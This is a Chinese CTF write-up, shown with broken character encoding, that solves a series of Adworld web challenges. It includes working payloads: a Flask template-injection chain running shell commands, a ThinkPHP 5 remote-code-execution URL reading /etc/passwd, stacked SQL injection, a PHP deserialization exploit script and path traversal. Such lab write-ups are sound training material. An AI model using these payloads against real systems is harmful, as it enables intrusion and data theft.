---
title: æ”»é˜²ä¸–ç•Œwebé«˜æ‰‹è¿›é˜¶åŒº(ä¸€)
date: 2022-06-25 17:39:54
tags: 
      - Web
categories:
      - [Web]
      - [CTF]
---

![image-20220626134350561](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261343729.png?x-oss-process=hzy)

<!--more-->

# baby_web

> æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª

![image-20220625155802774](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251558822.png?x-oss-process=hzy)

æœ‰æç¤ºï¼Œåˆå§‹é¡µæ˜¯index.php,ä½†æ˜¯ç›´æ¥åœ¨æµè§ˆå™¨è®¿é—®ä¼šå¾ˆå¿«è·³è½¬ï¼Œå¯ä»¥f12ï¼Œä¹Ÿå¯ä»¥bpæŠ“åŒ…éƒ½è¡Œï¼Œè¿™é‡Œæˆ‘ç›´æ¥f12äº†

![image-20220625160026459](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251600549.png?x-oss-process=hzy)

```
flag{very_baby_web}
```



# PHP2

![image-20220625155029520](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251550702.png?x-oss-process=hzy)

é¢˜ç›®æ˜¯php2ï¼Œæ‰€ä»¥å°±å¾¡å‰‘æ‰«ä¸€ä¸‹ï¼Œå¾—åˆ°è·¯å¾„æ˜¯æœ‰`/index.php`å’Œ`/index.phps`,è®¿é—®ä¸€ä¸‹åœ¨phpsé‡Œé¢çœ‹åˆ°äº†ä»£ç 

![image-20220625155156553](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251551606.png?x-oss-process=hzy)

åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆä¸èƒ½è®©ç¬¬ä¸€ä¸ªifè¯­å¥æ»¡è¶³ï¼Œè¦å¯¹adminè¿›è¡Œurlç¼–ç ï¼Œç„¶åéœ€è¦æ»¡è¶³ç¬¬äºŒä¸ªifè¯­å¥ï¼Œä»è€Œå¾—åˆ°flag

> å½“ä¼ å…¥å‚æ•°idæ—¶ï¼Œæµè§ˆå™¨åœ¨åé¢ä¼šå¯¹éASCIIç çš„å­—ç¬¦è¿›è¡Œä¸€æ¬¡urlencodeç¼–ç ï¼Œè¿è¡Œæ—¶ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecode

å› ä¸ºæˆ‘ä»¬åœ¨urlè¿æ¥é‡Œç›´æ¥è¿è¡Œï¼Œæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œå°±æ˜¯å¯¹adminè¿›è¡Œä¸¤æ¬¡ç¼–ç å†è¿è¡Œ

```
urldecode(%2561)=%61  
urldecode(%61)=a
```

æ‰€ä»¥æœ€åçš„payloadæ˜¯

```
?id=%2561dmin
```

![image-20220625155502178](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251555246.png?x-oss-process=hzy)

```
cyberpeace{97dd863245b712ede4c62c9c0acf0ce0}
```

# Training-WWW-Robots

![image-20220625155620170](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251556232.png?x-oss-process=hzy)

çœ‹é¢˜ç›®åº”è¯¥ä¹ŸçŸ¥é“éœ€è¦å¹²å•¥äº†ï¼Œçœ‹robots.txt

![image-20220625155642461](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251556511.png?x-oss-process=hzy)

è®¿é—®å¾—åˆ°flag

```
cyberpeace{6476bf5f013b5b6852f65b11200c87c1}
```

# ics-06

> äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚

![image-20220625160213446](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251602653.png?x-oss-process=hzy)

èŠ±é‡Œèƒ¡å“¨ï¼Œå•¥éƒ½ç‚¹ä¸äº†ï¼Œå°±é‚£ä¸ªæŠ¥è¡¨ä¸­å¿ƒå¯ä»¥ç‚¹

![image-20220625160353561](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251603616.png?x-oss-process=hzy)

æ—¥æœŸå¡«å•¥éƒ½ä¸è¡Œï¼Œä½†æ˜¯çœ‹åˆ°äº†è·¯å¾„é‡Œçš„id=1ï¼Œsqlæ³¨å…¥ä¹Ÿæ²¡æœ‰ï¼Œæ˜¯æˆ‘æƒ³å¤šäº†ï¼Œä½†æ˜¯çœŸä¸çŸ¥é“å’‹å†™ï¼ŒæŠ“åŒ…çˆ†ç ´å€¼çœ‹çœ‹

![image-20220625160729623](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251607674.png?x-oss-process=hzy)

æœç„¶è¿™ä¹ˆæ— èŠã€‚ã€‚ã€‚ã€‚

![image-20220625160755777](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251607834.png?x-oss-process=hzy)

# Web_python_template_injection

![image-20220625160842656](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251608714.png?x-oss-process=hzy)

pythonæ¨¡æ¿æ³¨å…¥(SSTI)ï¼Œè¿™ä¸ªå’Œpythonçš„[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)æ¨¡æ¿æ¼æ´æœ‰å…³ï¼Œå°è¯•ä½¿ç”¨flaskæ¨¡æ¿çš„æ¼æ´è¯•è¯•ï¼Œæ„é€ çš„payloadä¸ºï¼š`/{{6*6}}`

![image-20220625161002232](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251610296.png?x-oss-process=hzy)

æ²¡æ¯›ç—…è€é“ï¼Œå°±æ˜¯è¿™ä¸ªæ¼æ´,å†è¯•è¯•æŸ¥çœ‹configæ–‡ä»¶`/{{config}}`

![image-20220625161210643](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251612736.png?x-oss-process=hzy)

å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶åŒ…ä¹Ÿæ²¡æœ‰è¢«ç¦ç”¨ï¼Œæ‰€ä»¥ç›´æ¥æŸ¥çœ‹æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶æœ‰å•¥

```
/{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

> classï¼šç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¹æ®å‰é¢çš„å˜é‡å½¢å¼å¯ä»¥å¾—åˆ°å…¶æ‰€å±çš„ç±»ã€‚
> init åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function
> globals[] ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚
> os.popen() æ–¹æ³•ç”¨äºä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ã€‚

![image-20220625161602723](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251616775.png?x-oss-process=hzy)

å˜¿å˜¿ï¼Œçœ‹åˆ°äº†æƒ³è¦çš„äº†

![image-20220625161731382](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251617451.png?x-oss-process=hzy)

# Web_php_unserialize

- phpååºåˆ—åŒ–

  

```
<?php 
class Demo {  // å®šä¹‰ä¸€ä¸ªåä¸ºDemoçš„ç±»
    private $file = 'index.php'; //å˜é‡çš„å±æ€§
    public function __construct($file) {   //è¿™ä¸ªç±»ä½¿ç”¨çš„ç±»æ–¹æ³•_constructå‡½æ•°
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true);   //è¿™ä¸ªç±»ä½¿ç”¨çš„ç±»æ–¹æ³•__destructå‡½æ•°
    }
    function __wakeup() {           // __wakeup ï¼Œè¿™ä¸ªå‡½æ•°è¦è·³è¿‡å»ï¼Œå› ä¸ºä»–è¦æ˜¯æ‰§è¡Œå°±ä¼šè¿”å›åˆ°index.php
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php   
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) {      //åˆ¤æ–­æ˜¯å¦ä¼ å…¥äº†å‚æ•°
    $var = base64_decode($_GET['var']);     //å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒåŠ å¯†
    if (preg_match('/[oc]:\d+:/i', $var)) {    //æ­£åˆ™æ£€æŸ¥
        die('stop hacking!'); 
    } else {
        @unserialize($var);    //è¿›è¡Œååºåˆ—åŒ–
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

è¿™é‡Œåˆ†æä¸€ä¸‹å¦‚ä½•å¾—åˆ°æœ€ç»ˆçš„flag

ç¬¬ä¸€æ­¥æˆ‘ä¹Ÿè¯´äº†ï¼Œéœ€è¦ç»•è¿‡å»é‚£ä¸ª_wakeupå‡½æ•°

> **__wakeup()**æ˜¯åœ¨ååºåˆ—åŒ–æ“ä½œä¸­èµ·ä½œç”¨çš„é­”æ³•å‡½æ•°ï¼Œå½“unserializeçš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨__wakeup()å‡½æ•°ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œä¼šä¼˜å…ˆè°ƒç”¨__wakeup()å‡½æ•°ã€‚

ç»•è¿‡æ–¹æ³•ï¼š_wakeupå‡½æ•°æ¼æ´å°±æ˜¯ä¸å¯¹è±¡çš„å±æ€§ä¸ªæ•°æœ‰å…³ï¼Œå¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„æ•°å­—ä¸çœŸå®å±æ€§ä¸ªæ•°ä¸€è‡´ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªæ•°å­—å¤§äºçœŸå®å±æ€§çš„ä¸ªæ•°ï¼Œé‚£å°±ä¼šç»•è¿‡è¿™ä¸ªå‡½æ•°ã€‚

ç¬¬äºŒæ­¥ç»•è¿‡æ­£åˆ™æ£€æŸ¥ï¼Œå¦åˆ™å°±ç›´æ¥è¾“å‡ºstopäº†ï¼Œè¿™ä¸ªæ­£åˆ™æ£€æŸ¥è¿™å¥æ‹‰å‡ºæ¥å•ç‹¬å†åˆ†æä¸€ä¸‹

> æ­£åˆ™åŒ¹é…çš„è§„åˆ™æ˜¯:åœ¨ä¸åŒºåˆ†å¤§å°å†™çš„æƒ…å†µä¸‹ ï¼Œ è‹¥å­—ç¬¦ä¸²å‡ºç° â€œo:æ•°å­—â€ æˆ–è€… "c:æ•°å­—â€™ è¿™æ ·çš„æ ¼å¼ ï¼Œ é‚£ä¹ˆå°±è¢«è¿‡æ»¤ã€‚å¾ˆæ˜æ˜¾ï¼Œå› ä¸º serialize() çš„å‚æ•°ä¸º object ï¼Œå› æ­¤å‚æ•°ç±»å‹è‚¯å®šä¸ºå¯¹è±¡ " O " ï¼Œ åˆå› ä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ä¸º å‚æ•°æ ¼å¼:å‚æ•°åé•¿åº¦ ï¼Œ å› æ­¤ " O:4 " è¿™æ ·çš„å­—ç¬¦ä¸²è‚¯å®šæ— æ³•é€šè¿‡æ­£åˆ™åŒ¹é…

ç»•è¿‡æ–¹æ³•ï¼šO:+4ä¸ä¼šè¢«è¿‡æ»¤ï¼Œä¸”æœ€åçš„å€¼ä¸ä¼šå‘ç”Ÿå˜åŒ–

ç¬¬ä¸‰æ­¥ç»•è¿‡å°±æ˜¯è¦æ˜¯base64åŠ å¯†

ç»•è¿‡æ–¹æ³•:ç›´æ¥åŠ å¯†å°±è¡Œã€‚

è„šæœ¬å¦‚ä¸‹

```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

//åˆ›å»ºå¯¹è±¡
$a = new Demo('fl4g.php');
//å¯¹å¯¹è±¡1è¿›è¡Œåºåˆ—åŒ–
$b = serialize($a);
//ç»•è¿‡æ­£åˆ™
$b = str_replace('O:4','O:+4',$b);
//ç»•è¿‡_wakeupå‡½æ•°
$b = str_replace(':1:',':2:',$b);
//baseåŠ å¯†
var_dump($b);
var_dump(base64_encode($b));
?>
```

```
è¿è¡Œç»“æœ
string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
```

![image-20220625164444504](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251644569.png?x-oss-process=hzy)

# php_rce

![image-20220625164539029](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251645107.png?x-oss-process=hzy)

THINKPHP v5æ¡†æ¶æ¼æ´

![image-20220625164829635](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251648695.png?x-oss-process=hzy)

åœ¨ç½‘ä¸Šæ‰¾ä¸ªexpç›´æ¥æ‰“

[Thinkphp5.0.20æ¼æ´](https://blog.csdn.net/qq_39281549/article/details/120260824)

```
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
// phpinfo
```

![image-20220625165001784](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251650875.png?x-oss-process=hzy)

å­˜åœ¨æ¼æ´ï¼Œåˆ©ç”¨å°±å®Œäº†

```
ï¼Ÿs=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd //æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶
```

![image-20220625165128191](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251651291.png?x-oss-process=hzy)

![image-20220625165215612](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251652663.png?x-oss-process=hzy)

# supersqli

![image-20220625165334545](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251653607.png?x-oss-process=hzy)

åªæœ‰1ï¼Œ2æœ‰æ•°æ®ï¼ŒåŠ `â€˜`å°±æŠ¥é”™

![image-20220625165556993](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251655053.png?x-oss-process=hzy)

å…¸å‹sqlæ³¨å…¥

çŒœå­—æ®µ

```
1' order by 2#
```

![image-20220625165725594](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251657645.png?x-oss-process=hzy)

```
1'' union select 1,2#
```

![image-20220625165808025](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251658077.png?x-oss-process=hzy)

è¢«è¿‡æ»¤äº†ï¼Œé‡‡ç”¨å †å æ³¨å…¥ï¼Œå…ˆæŸ¥è¯¢æ•°æ®åº“

```
1â€™;show databases;--+
```

![image-20220625170001721](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251700782.png?x-oss-process=hzy)

æŸ¥è¡¨

```
1';show tables;--+
```

![image-20220625170030160](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251700223.png?x-oss-process=hzy)

åˆ†åˆ«æŸ¥è¯¢ä¸¤ä¸ªè¡¨çš„å­—æ®µ

```
1'; show columns from `1919810931114514` ;--+
1â€™; show columns from words;--+
```

![image-20220625170405564](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251704632.png?x-oss-process=hzy)![image-20220625170905218](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251709296.png?x-oss-process=hzy)

æŸ¥è¯¢å­—æ®µå†…å®¹

ä¸¤ç§æ–¹æ³•

- æ”¹è¡¨å

  æ ¹æ®åœ¨wordsè¡¨é‡Œå‘ç°idå­—æ®µä¸æŸ¥è¯¢æ¡†é‡Œçš„å‡ºçš„æ•°æ®ç±»å‹ç›¸åŒï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨ï¼Œinjectï¼ˆæœç´¢æ¡†ä¸­ï¼‰å€¼åº”è¯¥èµ‹ç»™äº†id
  **åˆ©ç”¨**ï¼šæˆ‘ä»¬å¯ä»¥å°†å«æœ‰flagå­—æ®µçš„è¡¨å‘½åä¸ºwordï¼Œç„¶åä¿®æ”¹å­—æ®µåå­—ï¼Œä¸å°±æŸ¥è¯¢åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼ï¼ˆå‰ææ˜¯è¿™é‡Œrenameï¼Œalertå…³é”®å­— æ²¡æœ‰åšè¿‡æ»¤ï¼‰

  ```
   ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #
   æ‹†å¼€ï¼š
  ;  alter tables words rename to words1; 
  ;  alter tables `1919810931114514` rename to words ;
  ;  alter tables words change flag id varchar(50); #
  ```

  æŸ¥çœ‹flagï¼š

  ```
  1' or 1=1 #  //å³å¯å¾—åˆ°
  ```

- é¢„ç¼–è¯‘

  payload

  

```
1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#
```

> ';sEt @sql = CONCAT(â€˜seâ€™,â€˜lect * from `1919810931114514`;â€™); è¿›è¡Œé¢„ç¼–è¯‘
> prEpare stmt from @sql; è®¾ç½®å˜é‡
> EXECUTE stmt;# æ‰§è¡Œ

flag{c168d583ed0d4d7196967b28cbd0b5e9}

# warmup

![image-20220625171823805](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251718905.png?x-oss-process=hzy)

å•¥ä¹Ÿæ²¡æœ‰ï¼Œçœ‹æºç 

![image-20220625171841977](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251718032.png?x-oss-process=hzy)

å¾—åˆ°æç¤ºï¼Œè®¿é—®/source.php,å¾—åˆ°ä»£ç 

```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

æœ‰ä¸ªhint.php,è®¿é—®ä¸€ä¸‹

![image-20220625172041581](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251720630.png?x-oss-process=hzy)

åˆ†ææºç 

```
 if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
```

> empty() å‡½æ•°ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºã€‚
> empty() åˆ¤æ–­ä¸€ä¸ªå˜é‡æ˜¯å¦è¢«è®¤ä¸ºæ˜¯ç©ºçš„ã€‚å½“ä¸€ä¸ªå˜é‡å¹¶ä¸å­˜åœ¨ï¼Œæˆ–è€…å®ƒ çš„å€¼ç­‰åŒäº FALSEï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è®¤ä¸ºä¸å­˜åœ¨ã€‚

å‘ç°æœ€åº•éƒ¨çš„ifè¯­å¥ä¸ºæ‰§è¡Œæ¡ä»¶ï¼Œæœ‰ä¸‰ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­æ–‡ä»¶ä¸èƒ½ä¸ºç©ºï¼ˆæ£€æŸ¥æ˜¯å¦ä¼ äº†fileå‚æ•°ï¼‰ï¼Œç¬¬äºŒè¿™ä¸ªä¼ çš„å‚æ•°æ˜¯[å­—ç¬¦ä¸²](https://so.csdn.net/so/search?q=å­—ç¬¦ä¸²&spm=1001.2101.3001.7020)ï¼Œç¬¬ä¸‰è¦è¿‡ç™½åå•æ£€æµ‹ï¼Œè¿‡äº†ä¹‹ååŒ…å« éšè—äº†flagçš„æ–‡ä»¶ã€‚å†çœ‹ä¸Šé¢çš„ifè¯­å¥ï¼Œç™½åå•æ˜¯hint.phpï¼Œåˆæœ‰mb_strposå’Œmb_substræˆªå–å†…å®¹ï¼Œæ‰€ä»¥åªéœ€è¦è¾“å…¥ source.php?file=source.php?å³å¯ç»•è¿‡ç™½åå•æ£€æµ‹ï¼Œç„¶ååœ¨è¾“å…¥â€¦/é€çº§è·³è½¬ç›®å½•è¯»å–flagå³å¯ï¼Œå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•

![image-20220625172424490](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251724566.png?x-oss-process=hzy)

```
http://111.200.241.244:54166/source.php?file=source.php?../../../../../ffffllllaaaagggg
```

å‚è€ƒï¼š

[warmup](https://blog.csdn.net/m0_53314778/article/details/112629012)

# NewsCenter

![image-20220625172907213](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251729264.png?x-oss-process=hzy)

ç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œæ²¡åš

# NaNNaNNaNNaN-Batman

é™„ä»¶é¢˜

```
<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';for(Y in $='	')with(_.split($[Y]))_=join(pop());eval(_)</script>
```

è¿™æ˜¯é™„ä»¶å†…å®¹ï¼Œå½“æˆ‘çœ‹åˆ°<script>æ ‡ç­¾æ—¶å°±è§‰å¾—æ”¹æˆhtmlçœ‹çœ‹

è¿™æ‰æ˜¯æºä»£ç 

```
    function $(){
    var e=document.getElementById("c").value; 		//æ­£åˆ™è¡¨è¾¾å¼
    if(e.length==16)								//è¾“å…¥ä¸º16ä½
    	if(e.match(/^be0f23/)!=null)
    		if(e.match(/233ac/)!=null)
    			if(e.match(/e98aa$/)!=null)
    				if(e.match(/c7be9/)!=null){    		//flag
    					var t=["fl","s_a","i","e}"];
    					var n=["a","_h0l","n"];
    					var r=["g{","e","_0"];
    					var i=["it'","_","n"];
    					var s=[t,n,r,i];
    					for(var o=0;o<13;++o){
    						document.write(s[o%4][0]);s[o%4].splice(0,1)
    						}
    					}
    				}
    				document.write('<input id="c"><button Î¿nclick=$()>Ok</button>');
    				delete 
```

é¦–å…ˆè¦æ»¡è¶³length==16ï¼Œæ­£åˆ™çš„è¯^ä¸ºå¼€å§‹ç¬¦å·ï¼Œ$ä¸ºç»“å°¾ç¬¦å·ï¼Œæ‹¼æ¥ä¸€ä¸‹ï¼šbe0f233ac7be98aa

![image-20220625173602031](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251736089.png?x-oss-process=hzy)

å‚è€ƒ:

https://blog.csdn.net/Mr_helloword/article/details/107928932

# web2

```
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
 
function encode($str){
    $_o=strrev($str); // strrevå‡½æ•°ä½œç”¨æ˜¯è¿›è¡Œåè½¬
    // echo $_o;
        
    for($_0=0;$_0<strlen($_o);$_0++){
       
        $_c=substr($_o,$_0,1);  // substrå‡½æ•°ä½œç”¨æ˜¯è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†
        $__=ord($_c)+1;  // ordå‡½æ•°æ˜¯è¿”å›ç¬¬ä¸€ä¸ªå­—æ¯çš„ascllå€¼ï¼Œè¿™é‡Œæ˜¯è¿”å›ä¹‹åå†åŠ 1
        $_c=chr($__);  // chrå‡½æ•°æ˜¯ä»æŒ‡å®šçš„ascllå€¼è¿”å›åˆ°å­—ç¬¦
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));  // str_rot13å‡½æ•°å°±æ˜¯å¸¸è§çš„rot13åŠ å¯†
}
 
highlight_file(__FILE__);
/*
   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag
*/
?>
```

> å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 è½¬æ¢,ROT13 ç¼–ç ç®€å•åœ°ä½¿ç”¨å­—æ¯è¡¨ä¸­åé¢ç¬¬ 13 ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯ï¼ŒåŒæ—¶å¿½ç•¥éå­—æ¯è¡¨ä¸­çš„å­—ç¬¦ã€‚ç¼–ç å’Œè§£ç éƒ½ä½¿ç”¨ç›¸åŒçš„å‡½æ•°ï¼Œä¼ é€’ä¸€ä¸ªç¼–ç è¿‡çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå°†å¾—åˆ°åŸå§‹å­—ç¬¦ä¸²ã€‚

phpæºç ï¼Œå®¡è®¡ä¹‹åå‘ç°æ˜¯éœ€è¦è§£å¯†miwenå³å¯å¾—åˆ°flag

åŠ å¯†è¿‡ç¨‹ä»£ç ä¸Šå·²ç»ç»™äº†ï¼Œåªéœ€è¦å†é€†è¿‡æ¥å°±å¯ä»¥äº†

```
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
$miwen=base64_decode(strrev(str_rot13($miwen)));
echo $miwen;
$m=$miwen;
        
    for($i=0;$i<strlen($m);$i++){
       
        $_c=substr($m,$i,1);
        $__=ord($_c)-1;  # å­—ç¬¦è½¬æ•°å­—å†å‡1
        $__=chr($__);  # æ•°å­—è½¬å­—ç¬¦
        $_=$_.$__;    # æ‹¼æ¥å­—ç¬¦ä¸²
    } 
    echo strrev($_);
?>
```

![image-20220707140427899](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071404130.png?x-oss-process=hzy)

# upload1

![image-20220707141126268](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071411427.png?x-oss-process=hzy)

å‰ç«¯æ ¡éªŒåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼ŒæŠ“åŒ…çœ‹çœ‹![image-20220707141445124](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071414269.png?x-oss-process=hzy)

æ˜¾ç¤ºä¸Šä¼ ä¸Šå»äº†ï¼Œæ”¹åç¼€ä¸€æ ·å¯ä»¥

![image-20220707141518574](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071415706.png?x-oss-process=hzy)

æ˜¾ç„¶æ˜¯æˆ‘å¤§é¢˜å°ä½œäº†ï¼Œå°±æ˜¯ä¸ªç®€å•çš„å‰ç«¯æ ¡éªŒï¼Œç›´æ¥è¿å°±è¡Œäº†

![image-20220707141624652](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071416792.png?x-oss-process=hzy)

# unserialize3

![image-20220626122348573](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261223649.png?x-oss-process=hzy)

é­”æ³•å‡½æ•°_wakeupã€‚

wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯æœ¬é¢˜çš„ç»•è¿‡ç‚¹ã€‚

> serialize()å’Œunserialize()å‡½æ•°å¯¹é­”æœ¯æ–¹æ³•çš„å¤„ç†ï¼šserialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()  ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œï¼Œæ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ã€‚
>
